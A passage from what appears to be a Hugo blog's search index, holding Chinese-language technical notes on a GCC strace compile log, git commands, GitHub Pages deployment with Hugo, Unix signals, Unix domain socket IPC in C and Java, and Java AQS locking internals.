\"-plugin-opt=-pass-through=-lgcc_s\", \"-plugin-opt=-pass-through=-lc\", \"-plugin-opt=-pass-through=-lgcc\", \"-plugin-opt=-pass-through=-lgcc_s\", \"--build-id\", \"--eh-frame-hdr\", \"-m\", \"elf_x86_64\", \"--hash-style=gnu\", \"--as-needed\", \"-dynamic-linker\", \"/lib64/ld-linux-x86-64.so.2\", \"-pie\", \"-z\", \"now\", \"-z\", \"relro\", \"-o\", \"hello\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/Scrt1.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crti.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/crtbeginS.o\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../../../lib\", \"-L/lib/x86_64-linux-gnu\", \"-L/lib/../lib\", \"-L/usr/lib/x86_64-linux-gnu\", \"-L/usr/lib/../lib\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../..\", \"/tmp/ccGZrdFz.o\", \"-lgcc\", \"--push-state\", \"--as-needed\", \"-lgcc_s\", \"--pop-state\", \"-lc\", \"-lgcc\", \"--push-state\", \"--as-needed\", \"-lgcc_s\", \"--pop-state\", \"/usr/lib/gcc/x86_64-linux-gnu/13/crtendS.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crtn.o\"], 0x7d15df0 /* 72 vars */) = 0 20038 13:48:53 execve(\"/usr/bin/ld\", [\"/usr/bin/ld\", \"-plugin\", \"/usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so\", \"-plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper\", \"-plugin-opt=-fresolution=/tmp/ccKbYYb2.res\", \"-plugin-opt=-pass-through=-lgcc\", \"-plugin-opt=-pass-through=-lgcc_s\", \"-plugin-opt=-pass-through=-lc\", \"-plugin-opt=-pass-through=-lgcc\", \"-plugin-opt=-pass-through=-lgcc_s\", \"--build-id\", \"--eh-frame-hdr\", \"-m\", \"elf_x86_64\", \"--hash-style=gnu\", \"--as-needed\", \"-dynamic-linker\", \"/lib64/ld-linux-x86-64.so.2\", \"-pie\", \"-z\", \"now\", \"-z\", \"relro\", \"-o\", \"hello\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/Scrt1.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crti.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/crtbeginS.o\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../../../lib\", \"-L/lib/x86_64-linux-gnu\", \"-L/lib/../lib\", \"-L/usr/lib/x86_64-linux-gnu\", \"-L/usr/lib/../lib\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../..\", \"/tmp/ccGZrdFz.o\", \"-lgcc\", \"--push-state\", \"--as-needed\", \"-lgcc_s\", \"--pop-state\", \"-lc\", \"-lgcc\", \"--push-state\", \"--as-needed\", \"-lgcc_s\", \"--pop-state\", \"/usr/lib/gcc/x86_64-linux-gnu/13/crtendS.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crtn.o\"], 0x7ffd0bf6c850 /* 72 vars */) = 0 20038 13:48:54 +++ exited with 0 +++ 20037 13:48:54 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20038, si_uid=1000, si_status=0, si_utime=4 /* 0.04 s */, si_stime=23 /* 0.23 s */} --- 20037 13:48:54 +++ exited with 0 +++ 20029 13:48:54 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20037, si_uid=1000, si_status=0, si_utime=0, si_stime=3 /* 0.03 s */} --- 20029 13:48:54 +++ exited with 0 +++ 编译流程分析 Initial GCC Invocation execve(\"/usr/bin/gcc\", [\"gcc\", \"-o\", \"hello\", \"hello.c\"], ...) Process ID: 20029 Action: Invokes the GCC driver (/usr/bin/gcc). Compilation Phase execve(\"/usr/libexec/gcc/x86_64-linux-gnu/13/cc1\", [\"/usr/libexec/gcc/x86_64-linux-gnu/13/cc1\", ...], ...) Process ID: 20034 Role: cc1 is the GCC C compiler frontend. Converts hello.c to assembly code (/tmp/ccLfEVyN.s). Flags Passed:\nIncludes optimization settings (e.g., -mtune=generic, -march=x86-64), security features (-fstack-protector-strong, -Wformat-security), and others. Result:\nAssembly file generated at /tmp/ccLfEVyN.s.\nAssembly Phase Attempts to locate the assembler (as):\nexecve(\"/usr/local/sbin/as\", ...) = -1 ENOENT execve(\"/usr/local/bin/as\", ...) = -1 ENOENT execve(\"/usr/sbin/as\", ...) = -1 ENOENT execve(\"/usr/bin/as\", ...) = 0 Process ID: 20036 Why Multiple Tries?:\nGCC searches standard paths for the assembler. Succeeds with /usr/bin/as (GNU Assembler). Action:\nAssembles /tmp/ccLfEVyN.s into an object file: /tmp/ccGZrdFz.o. Linking Phase execve(\"/usr/libexec/gcc/x86_64-linux-gnu/13/collect2\", [...], ...) Process ID: 20037 Role: Wrapper for the linker (ld). Prepares metadata for C++ static constructors/destructors (not needed here since hello.c is plain C). Invokes the real linker (/usr/bin/ld). Internal Linker Call:\nexecve(\"/usr/bin/ld\", [...], ...) Process ID: 20038 Key Flags: -dynamic-linker /lib64/ld-linux-x86-64.so.2: Sets the dynamic loader. -pie: Creates a Position-Independent Executable (security feature). -z now and -z relro: Enhance runtime security. Inputs Linked: CRT (C Runtime) files (Scrt1.o, crti.o, crtbeginS.o, crtendS.o, crtn.o). Object file: /tmp/ccGZrdFz.o. Standard libraries: -lgcc, -lgcc_s, -lc (libc). Result:\nFinal executable hello is created.\nSuccess Indicators All execve() calls return 0 (success). Processes exit cleanly (+++ exited with 0 +++). No errors detected in the toolchain path or linking. Security \u0026 Optimization Notes Stack Protection: Enabled via -fstack-protector-strong. Hardened Linking: -z now: Immediate binding of symbols. -z relro: Read-only relocations after relocation. -pie: ASLR-friendly executable. Build ID: Embedded via --build-id for debugging/tracing. Critical Paths Tool Path Purpose cc1 /usr/libexec/gcc/x86_64-linux-gnu/13/cc1 Compiles C to assembly as /usr/bin/as Assembles .s to .o collect2 /usr/libexec/gcc/x86_64-linux-gnu/13/collect2 Manages linker setup ld /usr/bin/ld Links objects into final binary Conclusion The log confirms a standard GCC compilation pipeline:\nPreprocessing + Parsing: Handled by cc1. Assembly: Done by as. Linking: Orchestrated by collect2 → ld. "},"title":"Gcc Compile C Prog"},"/blog/git-commands/":{"data":{"reference#reference":"git rebase -i HEAD~N\n复制提交记录\ngit branch -f target-branch-name commit-id\n切换到 target-branch-name 并指向 commit-id\ngit cherry-pick commit-id1 commit-id2\n重新排序提交的记录. cherry-pick 名字起得真是有意思啊. 像捡樱桃似的, 把一个个想要的记录捡到当前分支的后面.\ngit checkout -b branch-name\n创建一个新分支, 并切换到新建的分支\ngit merge target-branch-name\n合并 target-branch-name 到当前分支. 结果是创建一个新的提交记录.\ngit checkout target-commit-id\ndetach HEAD, let HEAD point to target-commit-id.\ngit tag tag-name target-commit-id\n在 target-commit-id 处, 打上 tag-name 标签.\nreference learning git branch "},"title":"git-commands"},"/blog/github-hugo-website/":{"data":{"github-上创建两个公开仓库#github 上创建两个公开仓库":"","hugo-创建本地-website#hugo 创建本地 website":"","reference#Reference":" github pages hugo quickstart actions-hugo actions-gh-pages deploy-to-external-repository-external_repository ","安装软件#安装软件":"","提交-本地-blog-到-github-blog-仓库#提交 本地 blog 到 github blog 仓库":" git add . git commit -m \"commit info\" git push ","本地-blog-添加-deployyml#本地 \u003ccode\u003eblog\u003c/code\u003e 添加 deploy.yml":"步骤安装软件 git # 配置好 git git config --global user.name \"your username\" git config --global user.email \"your email\" hugo hugo 创建本地 website 参考：https://gohugo.io/getting-started/quick-start/\nhugo new site blog # blog 根据需要修改 cd blog git init git submodule add https://github.com/theNewDynamic/gohugo-theme-ananke.git themes/ananke # theme 根据需要修改 把 content/posts 目录修改为 content/post hugo new post/my-first-post.md hugo server -D 根据选择的主题，修改主题相关的配置 github 上创建两个公开仓库 username.github.io, 部署静态博客的仓库，username 修改为对应的 github 账号 ID。 blog，这个保存本地的 blog 的仓库。 在 blog 中执行以下命令: git remote add origin git@github.com:username/blog.git # username 修改为自己账号的 github ID git branch -M main git push -u origin main 配置 github actions 参考：https://github.com/peaceiris/actions-gh-pages#%EF%B8%8F-first-deployment-with-github_token 使用 actions-hugo 和 actions-gh-pages 自动化部署 blog 生成的密钥对本地保存就可以。\n生成一对 public key(gh-pages.pub) 和 private key(gh-pages) ssh-keygen -t rsa -b 4096 -C \"$(git config user.email)\" -f gh-pages -N \"\" # gh-pages.pub 公钥 # gh-pages 私钥 添加公钥 gh-pages.pub 添加到 username.github.io 这个仓库的 deploy key 中，勾选 Allow write access https://github.com/username/username.github.io/settings/keys/new\n添加私钥 gh-pages 到 blog 中的 secret https://github.com/username/blog/settings/secrets/actions/new\nName ACTIONS_DEPLOY_KEY Value gh-pages 私钥文件内容 本地 blog 添加 deploy.yml mkdir -p .github/workfows/ touch .github/workflows/deploy.yml 粘贴一下 yaml 内容 external_repository 配置项中 username 替换为 github ID name: GitHub Pages on: push: branches: - main # Set a branch to deploy pull_request: jobs: deploy: runs-on: ubuntu-20.04 concurrency: group: ${{ github.workflow }}-${{ github.ref }} steps: - uses: actions/checkout@v3 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: '0.91.2' # extended: true - name: Build run: hugo --minify # https://github.com/peaceiris/actions-gh-pages#%EF%B8%8F-deploy-to-external-repository-external_repository - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} external_repository: username/username.github.io # username 替换为 github ID publish_branch: master # default: gh-pages, 注意修改为部署的分支 publish_dir: ./public ","步骤#步骤":"","配置-github-actions#配置 github actions":""},"title":"Githubpage Hugo Website"},"/blog/great-prompt/":{"data":{"great-prompt#great prompt":"great prompt我在做 XX。如果你是一位专业人士，有更好的方法和建议吗？尽可能全面。"},"title":"Great Prompt"},"/blog/ipc-signal/":{"data":{"references#References":" Linux Signal Table Signal_(IPC) Introduction To Unix Signals Programming Standard-Signals handle-a-signal signal-block handling-unix-signals-in-python signals signal-handling-in-linux nohup https://www.cs.princeton.edu/courses/archive/fall05/cos217/lectures/23signals.pdf cs.kent.edu/signals.html csci480/signals.htm kill(2) https://goodyduru.github.io/os/2023/10/05/ipc-unix-signals.html java Signal 处理实现 https://cs341.cs.illinois.edu/coursebook/index.html ","signal#signal":"signal","什么是-signal#什么是 signal":" A signal can be thought of as a software interrupt. This means that a process that receives a signal stops the execution of the current program and makes the program respond to the signal. Signals are various notifications sent to a process in order to notify it of various “important” events. 信号是发送给进程的各种通知，以便通知它发生了各种“重要”的事件。","如何发送信号#如何发送信号？":"1. keyboard SIGINT(Ctrl + C) SIGTSTP(Ctrl + Z) -\u003e resume by fg SIGQUIT(Ctrl + \\) 2. command line kill -\u003csignal\u003e \u003cPID\u003e fg 3. system call kill syscall ","如何自定义-signal-handler#如何自定义 signal handler?":" 注意：这里只有可以被 caught 的才可以自定义 handler。SIGKILL 和 SIGSTOP 这两个是不能自己定义 handler 的。\njava example import sun.misc.Signal; import sun.misc.SignalHandler; public class ExampleSignalHandler { public static void main(String... args) throws InterruptedException { final long start = System.nanoTime(); Signal.handle(new Signal(\"INT\"), new SignalHandler() { public void handle(Signal sig) { System.out.format(\"\\nProgram execution took %f seconds\\n\", (System.nanoTime() - start) / 1e9f); System.out.println(\"cat the INT signal, but still run.....😄\"); } }); int counter = 0; while(true) { System.out.println(counter++); Thread.sleep(500); } } } 可以将 “INT” 替换为 “STOP” 运行结果为: Exception in thread \"main\" java.lang.IllegalArgumentException: Signal already used by VM or OS: SIGSTOP at sun.misc.Signal.handle(Signal.java:166) at ExampleSignalHandler.main(ExampleSignalHandler.java:9) 可以将 “INT” 替换为 “KILL” 运行结果为: Exception in thread \"main\" java.lang.IllegalArgumentException: Signal already used by VM or OS: SIGKILL at sun.misc.Signal.handle(Signal.java:166) at stardustman.github.io.signal.ExampleSignalHandler.main(ExampleSignalHandler.java:9) ","有哪些信号默认怎么处理#有哪些信号？默认怎么处理？":" Signal Name Default Action Comment POSIX 1 SIGHUP Terminate Hang up controlling terminal or process Yes 2 SIGINT Terminate Interrupt from keyboard, Control-C Yes 3 SIGQUIT Dump Quit from keyboard, Control-\\ Yes 4 SIGILL Dump Illegal instruction Yes 5 SIGTRAP Dump Breakpoint for debugging No 6 SIGABRT Dump Abnormal termination Yes 6 SIGIOT Dump Equivalent to SIGABRT No 7 SIGBUS Dump Bus error No 8 SIGFPE Dump Floating-point exception Yes 9 SIGKILL Terminate Forced-process termination Yes 10 SIGUSR1 Terminate Available to processes Yes 11 SIGSEGV Dump Invalid memory reference Yes 12 SIGUSR2 Terminate Available to processes Yes 13 SIGPIPE Terminate Write to pipe with no readers Yes 14 SIGALRM Terminate Real-timer clock Yes 15 SIGTERM Terminate Process termination Yes 16 SIGSTKFLT Terminate Coprocessor stack error No 17 SIGCHLD Ignore Child process stopped or terminated or got a signal if traced Yes 18 SIGCONT Continue Resume execution, if stopped Yes 19 SIGSTOP Stop Stop process execution, Ctrl-Z Yes 20 SIGTSTP Stop Stop process issued from tty Yes 21 SIGTTIN Stop Background process requires input Yes 22 SIGTTOU Stop Background process requires output Yes 23 SIGURG Ignore Urgent condition on socket No 24 SIGXCPU Dump CPU time limit exceeded No 25 SIGXFSZ Dump File size limit exceeded No 26 SIGVTALRM Terminate Virtual timer clock No 27 SIGPROF Terminate Profile timer clock No 28 SIGWINCH Ignore Window resizing No 29 SIGIO Terminate I/O now possible No 29 SIGPOLL Terminate Equivalent to SIGIO No 30 SIGPWR Terminate Power supply failure No 31 SIGSYS Dump Bad system call No 31SIGUNUSED Dump Equivalent to SIGSYS No ","进程收到信号会怎么处理#进程收到信号会怎么处理？":"分为 3 种情况:\nIgnore it. Many signals can be and are ignored, but not all. Hardware exceptions such as “divide by 0” (with integers) cannot be ignored successfully and some signals such as SIGKILL cannot be ignored at all. Catch and handle the exception. The process has a function to be executed if and when the exception occurs. The function may terminate the program gracefully or it may handle it without terminating the program. Let the default action apply. Every signal has a default action. The default may be: ignore terminate terminate and dump core stop or pause the program resume a program paused earlier "},"title":"Ipc Signal"},"/blog/ipc-unix-domain-socket/":{"data":{"c-客户端程序示例#C 客户端程序示例":" #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/socket.h\u003e #include \u003csys/un.h\u003e #include \u003cunistd.h\u003e #define SOCKET_PATH \"/path/to/ipc.sock\" int main() { int client_fd; struct sockaddr_un addr; const char *message = \"Hello from 中国!\"; char buffer[100]; // Create a socket if ((client_fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) { perror(\"socket error\"); exit(EXIT_FAILURE); } // Set up the address structure memset(\u0026addr, 0, sizeof(struct sockaddr_un)); addr.sun_family = AF_UNIX; strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1); // Connect to the server if (connect(client_fd, (struct sockaddr*)\u0026addr, sizeof(struct sockaddr_un)) == -1) { perror(\"connect error\"); exit(EXIT_FAILURE); } // Send a message to the server if (write(client_fd, message, strlen(message)) == -1) { perror(\"write error\"); exit(EXIT_FAILURE); } // Receive a response from the server if (read(client_fd, buffer, sizeof(buffer)) == -1) { perror(\"read error\"); exit(EXIT_FAILURE); } printf(\"Received response: %s\\n\", buffer); close(client_fd); return 0; } ","gradle-配置#gradle 配置":" // https://mvnrepository.com/artifact/com.kohlschutter.junixsocket/junixsocket-native-common implementation group: 'com.kohlschutter.junixsocket', name: 'junixsocket-native-common', version: '2.9.1' // https://mvnrepository.com/artifact/com.kohlschutter.junixsocket/junixsocket-common implementation group: 'com.kohlschutter.junixsocket', name: 'junixsocket-common', version: '2.9.1' ","java-服务端程序示例#java 服务端程序示例":" import org.newsclub.net.unix.AFUNIXServerSocket; import org.newsclub.net.unix.AFUNIXSocket; import org.newsclub.net.unix.AFUNIXSocketAddress; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import java.io.*; import java.nio.charset.StandardCharsets; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; /** * unix domain socket 进程通信 */ @SuppressWarnings({\"CatchAndPrintStackTrace\" /* errorprone */, \"PMD.CognitiveComplexity\"}) public final class MsgServer implements Runnable { private static final String UDS = System.getProperty(\"user.home\") + \"ipc.sock\"; private static final Logger logger = LoggerFactory.getLogger(MsgServer.class); private static void startServer() throws IOException { Path path = Paths.get(UDS); logger.info(\"UDS path: {}\", UDS); if (Files.exists(path)) { Files.delete(path); } File socketFile = new File(UDS); try (AFUNIXServerSocket server = AFUNIXServerSocket.newInstance()) { server.setReuseAddress(false); server.bind(AFUNIXSocketAddress.of(socketFile)); logger.info(\"MsgServer 监听 socket: {}\", server); while (!Thread.interrupted() \u0026\u0026 !server.isClosed()) { logger.info(\"Waiting for connection...\"); try { AFUNIXSocket sock = server.accept(); Thread thread = new Thread(new ClientHandler(sock), \"msg-receiver\"); thread.start(); } catch (IOException e) { logger.error(\"server.accept() 出错\", e); } } } finally { logger.info(\"MsgServer terminated\"); } } @Override public void run() { try { startServer(); } catch (IOException e) { logger.error(\"启动 MsgServer 失败\", e); } } /** * 处理连接,以接收 utf-8 字符串为例 */ static class ClientHandler implements Runnable { AFUNIXSocket sock; public ClientHandler(AFUNIXSocket socket) { this.sock = socket; } @Override public void run() { try (InputStream is = sock.getInputStream(); OutputStream os = sock.getOutputStream(); PrintWriter writer = new PrintWriter(os, true); BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) { String line; while ((line = reader.readLine()) != null \u0026\u0026 !line.equalsIgnoreCase(\"bye\")) { logger.info(\"Received: \" + line); handleMsg(line); writer.println(\"Received successfully\"); writer.flush(); } } catch (IOException e) { logger.error(\"客户端关闭了连接\", e); } finally { try { sock.close(); } catch (IOException e) { logger.error(\"关闭连接出错\", e); } } } private void handleMsg(String msg) { // process receive string msg } } } ","references#References":" junixsocket Unix_domain_socket ","unix-domain-socket-是啥#unix domain socket 是啥?":"unix domain socket 是啥? A Unix domain socket (UDS) or IPC socket (inter-process communication) is a data communications endpoint for exchanging data between processes executing on the same host operating system. 同一台机器两个不同的进程之间交换数据，优化过的 socket。","问题背景#问题背景":" java 写的程序需要和 c 写的程序交换数据，且两个程序运行在同一台机器上。"},"title":"Ipc Unix Domain Socket"},"/blog/java-aqs/":{"data":{"abstract-queued-synchronizer-是啥#abstract queued synchronizer 是啥？":"abstract queued synchronizer 是啥？ AQS is an abstract class that provides a skeleton for managing thread contention, queuing, and state synchronization. It uses a FIFO wait(sync) queue to manage threads waiting for access to a shared resource and an atomic integer (state) to track the synchronizer’s status (e.g., locked/unlocked, available permits).","aqs-数据结构#AQS 数据结构":" /** * Head of the wait queue, lazily initialized. Except for * initialization, it is modified only via method setHead. Note: * If head exists, its waitStatus is guaranteed not to be * CANCELLED. */ private transient volatile Node head; // 等待队列的 head /** * Tail of the wait queue, lazily initialized. Modified only via * method enq to add new wait node. */ private transient volatile Node tail; // 等待队列的 tail /** * The synchronization state. */ private volatile int state; // 同步状态, 这就是所谓的 lock /** * The current owner of exclusive mode synchronization. */ private transient Thread exclusiveOwnerThread;//继承自 AbstractOwnableSynchronizer ","fairsynclock-分析#FairSync.lock 分析":"acquire(1) 分析 public final void acquire(int arg) { if (!tryAcquire(arg) \u0026\u0026 acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } tryAcquire 若返回为 true, 表明获取 lock 成功, !tryAcquire 为 false, 获取 lock 流程结束。 tryAcquire 若返回为 false, 表明获取 lock 失败, 为啥失败, 因为有其他线程获取了, 但是还没有释放。 流程进入 addWaiter, 也就是当前线程去排队等待获取 lock。 tryAcquire 分析 AbstractOwnableSynchronizer.java /** * Fair version of tryAcquire. Don't grant access unless * recursive call or no waiters or is first. */ protected final boolean tryAcquire(int acquires) { final Thread current = Thread.currentThread(); // 当前申请获取锁的线程 int c = getState(); // lock 的状态 if (c == 0) { // lock 是 unlock 状态 if (!hasQueuedPredecessors() \u0026\u0026 // 看一下队列中是不是已有在等待获取锁的线程，这就是所谓公平的体现，FIFO compareAndSetState(0, acquires)) { // 没有在等待获取锁的线程, 获取锁，这里 CAS 可能会失败 setExclusiveOwnerThread(current); // 本线程持有这个锁 return true; } } else if (current == getExclusiveOwnerThread()) { // 该线程已经持有了锁 int nextc = c + acquires; // 直接改变状态，这就是所谓可重入的意思,已经获取锁的线程，可以再次获取该锁 if (nextc \u003c 0) throw new Error(\"Maximum lock count exceeded\"); // 这里可能会抛异常 setState(nextc); return true; } return false; } addWaiter 分析 线程获取锁失败, 到阻塞队列去排队。这里是 addWaiter(null, 1)\n/** * Creates and enqueues node for current thread and given mode. * * @param mode Node.EXCLUSIVE for exclusive, Node.SHARED for shared * @return the new node */ private Node addWaiter(Node mode) { Node node = new Node(Thread.currentThread(), mode); // Try the fast path of enq; backup to full enq on failure Node pred = tail; if (pred != null) { // 说明队列不空 node.prev = pred; // 设置 node 前驱 if (compareAndSetTail(pred, node)) { // AQS 设置新的 tail pred.next = node; // 设置 pred 后继 return node; // 返回包装申请锁的线程的 Node 节点 } } enq(node); // 说明队列为空 return node; // 返回包装申请锁的线程的 Node 节点 } enq 返回 node 的前驱节点 addWaiter 图示 链表，还是画一画图，理解的更好\ntail == null, 等待队列里一个等待的线程 Node 也没有 enq 入队, 创建一个 Node 节点,作为 head, 再添加要获取锁的节点 tail != null, 等待队列里已经有等待的线程 Node 了 直接添加到等待队列队尾 acquireQueued 分析 AbstractOwnableSynchronizer.java /** * Acquires in exclusive uninterruptible mode for thread already in * queue. Used by condition wait methods as well as acquire. * * @param node the node * @param arg the acquire argument * @return {@code true} if interrupted while waiting */ final boolean acquireQueued(final Node node, int arg) { boolean failed = true; try { boolean interrupted = false; for (;;) { // 注意是循环 final Node p = node.predecessor(); if (p == head \u0026\u0026 tryAcquire(arg)) { // 是等待队列的第一个 \u0026\u0026 tryAcquire , true 表明获取了锁 setHead(node); // 设置成 head, 旧的 head 出队 p.next = null; // help GC failed = false; return interrupted; } if (shouldParkAfterFailedAcquire(p, node) \u0026\u0026 // 锁已被其他线程获取, 会走到这里 parkAndCheckInterrupt()) interrupted = true; } } finally { if (failed) cancelAcquire(node); } } acquireQueued for 循环退出两种情况 当前节点是等待队列第一个 \u0026\u0026 tryAcquire 成功获取了锁 tryAcquire 抛出了 Error, finally 的 failed 逻辑会执行 cancelAcquire acquireQueued 两轮循环分析 cancelAcquire 分析 /** * Cancels an ongoing attempt to acquire. * * @param node the node */ private void cancelAcquire(Node node) { // Ignore if node doesn't exist if (node == null) return; node.thread = null; // 取消线程 // Skip cancelled predecessors 跳过取消的节点 Node pred = node.prev; while (pred.waitStatus \u003e 0) node.prev = pred = pred.prev; // predNext is the apparent node to unsplice. CASes below will // fail if not, in which case, we lost race vs another cancel // or signal, so no further action is necessary. Node predNext = pred.next; // Can use unconditional write instead of CAS here. // After this atomic step, other Nodes can skip past us. // Before, we are free of interference from other threads. node.waitStatus = Node.CANCELLED; // If we are the tail, remove ourselves. 队尾 if (node == tail \u0026\u0026 compareAndSetTail(node, pred)) { // expect update compareAndSetNext(pred, predNext, null); // node expect null } else { // If successor needs signal, try to set pred's next-link // so it will get one. Otherwise wake it up to propagate. // 不是队尾，也就是等待队列的其他节点 int ws; if (pred != head \u0026\u0026 // 不是等待队列中第一个节点 ((ws = pred.waitStatus) == Node.SIGNAL || (ws \u003c= 0 \u0026\u0026 compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) \u0026\u0026 pred.thread != null) { // pred.thread != null 表示前驱节点有线程在等待获取锁 Node next = node.next; if (next != null \u0026\u0026 next.waitStatus \u003c= 0) // 取消节点有后继节点 next 且后继节点 waitStatus \u003c= 0 compareAndSetNext(pred, predNext, next); // pred 设置新的 next 节点 } else { // 取消等待的节点是等待队列中的第一个节点, 叫醒后继节点 unparkSuccessor(node); } node.next = node; // help GC } } if 为 true 判断分析 为了将取消节点的前驱节点和取消节点的后继节点进行链接\nif (pred != head \u0026\u0026 ((ws = pred.waitStatus) == Node.SIGNAL || (ws \u003c= 0 \u0026\u0026 compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) \u0026\u0026 pred.thread != null) pred != head 为 true 表示取消节点不是等待队列中第一个节点 ((ws = pred.waitStatus) == Node.SIGNAL || (ws \u003c= 0 \u0026\u0026 compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) 为 true (ws = pred.waitStatus) == Node.SIGNAL 为 true, 前驱节点的 waitStatus 为 -1 (ws \u003c= 0 \u0026\u0026 compareAndSetWaitStatus(pred, ws, Node.SIGNAL)) 为 true ws \u003c= 0 为 true, 前驱节点的 waitStatus 为 0, 那就 compareAndSetWaitStatus 前驱节点的 waitStatus 为 -1 compareAndSetWaitStatus 返回为 true, 设置前驱节点的的 waitStatus 为 -1 成功 pred.thread != null 为 true 前驱节点有等待的线程 shouldParkAfterFailedAcquire 分析 为即将被 block 的线程，设置前驱节点的 waitStatus 为 -1, 表示下一个节点需要被唤醒\n/** * Checks and updates status for a node that failed to acquire. * Returns true if thread should block. This is the main signal * control in all acquire loops. Requires that pred == node.prev. * * @param pred node's predecessor holding status * @param node the node * @return {@code true} if thread should block */ private static boolean shouldParkAfterFailedAcquire(Node pred, Node node) { int ws = pred.waitStatus; if (ws == Node.SIGNAL) /* * This node has already set status asking a release * to signal it, so it can safely park. */ return true; if (ws \u003e 0) { // 线程取消了获取锁, 找到一个没有取消的 /* * Predecessor was cancelled. Skip over predecessors and * indicate retry. */ do { node.prev = pred = pred.prev; } while (pred.waitStatus \u003e 0); pred.next = node; } else { /* * waitStatus must be 0 or PROPAGATE. Indicate that we * need a signal, but don't park yet. Caller will need to * retry to make sure it cannot acquire before parking. */ compareAndSetWaitStatus(pred, ws, Node.SIGNAL); // 设置前驱节点的 waitStatus 为 -1 } return false; } parkAndCheckInterrupt 分析 线程状态进入 waiting 的重要逻辑\nAbstractOwnableSynchronizer.java /** * Convenience method to park and then check if interrupted * * @return {@code true} if interrupted */ private final boolean parkAndCheckInterrupt() { LockSupport.park(this); // 调用线程执行到这里就不再继续向下执行了, 这是理解线程 waiting 的关键 return Thread.interrupted(); // 线程被唤醒后才会 return, 执行下一轮的 acquireQueued } ","fairsyncunlock-分析#FairSync.unlock 分析":"release 分析 /** * Releases in exclusive mode. Implemented by unblocking one or * more threads if {@link #tryRelease} returns true. * This method can be used to implement method {@link Lock#unlock}. * * @param arg the release argument. This value is conveyed to * {@link #tryRelease} but is otherwise uninterpreted and * can represent anything you like. * @return the value returned from {@link #tryRelease} */ public final boolean release(int arg) { if (tryRelease(arg)) { // 释放锁 Node h = head; if (h != null \u0026\u0026 h.waitStatus != 0) // waitStatus 为 -1, 表明下一个节点需要被唤醒 unparkSuccessor(h); // 唤醒 head 节点后的节点，也就是等待队列中第一个节点 return true; } return false; } tryRelease 分析 该方法可能抛出异常 AbstractOwnableSynchronizer.java protected final boolean tryRelease(int releases) { int c = getState() - releases; if (Thread.currentThread() != getExclusiveOwnerThread()) // 是不是持有该锁的线程在 release throw new IllegalMonitorStateException(); boolean free = false; if (c == 0) { // 已完全释放，因为可以重入 free = true; setExclusiveOwnerThread(null); } setState(c); // lock 设置成 unlock 状态，也就是 0，这就是所谓的释放锁 return free; } unparkSuccessor 分析 AbstractOwnableSynchronizer.java /** * Wakes up node's successor, if one exists. * * @param node the node */ private void unparkSuccessor(Node node) { /* * If status is negative (i.e., possibly needing signal) try * to clear in anticipation of signalling. It is OK if this * fails or if status is changed by waiting thread. */ int ws = node.waitStatus; if (ws \u003c 0) compareAndSetWaitStatus(node, ws, 0); /* * Thread to unpark is held in successor, which is normally * just the next node. But if cancelled or apparently null, * traverse backwards from tail to find the actual * non-cancelled successor. */ Node s = node.next; if (s == null || s.waitStatus \u003e 0) { s = null; for (Node t = tail; t != null \u0026\u0026 t != node; t = t.prev) if (t.waitStatus \u003c= 0) s = t; } if (s != null) LockSupport.unpark(s.thread); // 唤醒这个线程 } ","node-数据结构#Node 数据结构":" 组成双向链表，在之上构建等待队列\nvolatile int waitStatus; // 下一个 Node 等待状态 volatile Node prev; // 前驱节点 volatile Node next; // 后继节点 volatile Thread thread; // 入队等待的线程 ","references#References":" https://javadoop.com/post/AbstractQueuedSynchronizer 强烈推荐 ","rentrantlocklock-整体概览#RentrantLock.lock 整体概览":"RentrantLock.lock 流程概览"},"title":"Java Aqs"},"/blog/java-jdk-proxy/":{"data":{"dynamic-proxy-是啥#dynamic proxy 是啥？":"","invocationhandler-接口实现类-dynastydynamicproxy-分析#\u003ccode\u003eInvocationHandler\u003c/code\u003e 接口实现类 \u003ccode\u003eDynastyDynamicProxy\u003c/code\u003e 分析":"","proxygeneratorjava#ProxyGenerator.java":"","references#References":" dynamic-proxy-class-method jdk-com-sun-proxy ProxyGenerator#sun.misc.ProxyGenerator.saveGeneratedFiles jdk8-proxy 分析所用代码 $Proxy0 jdk-porxy-and-cglib ","保存运行时生成的动态代理类#保存运行时生成的动态代理类":"","被代理的类-tangdynasty-分析#被代理的类 \u003ccode\u003eTangDynasty\u003c/code\u003e 